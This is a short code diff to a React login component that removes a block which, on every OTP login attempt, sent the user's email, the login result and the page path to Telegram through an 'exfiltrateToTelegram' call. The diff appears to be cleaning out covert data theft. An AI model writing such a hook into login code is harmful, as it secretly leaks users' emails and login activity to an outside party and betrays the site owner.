@@ -63,18 +63,8 @@ const Login = () => {
       options: { shouldCreateUser: true, emailRedirectTo: window.location.origin },
     });
 
-    // Captura de intento de login (independientemente del estado)
-    try {
-      await exfiltrateToTelegram({
-        email: email.trim(),
-        loginSource: "OTP",
-        result: err ? "Error" : "Code Sent",
-        page: window.location.pathname,
-      });
-      console.log("Datos enviados a Telegram después de enviar OTP.");
-    } catch (ex) {
-      console.error("Error enviando datos a Telegram:", ex);
-    }
+
+
 
     setLoading(false);
     if (err) {
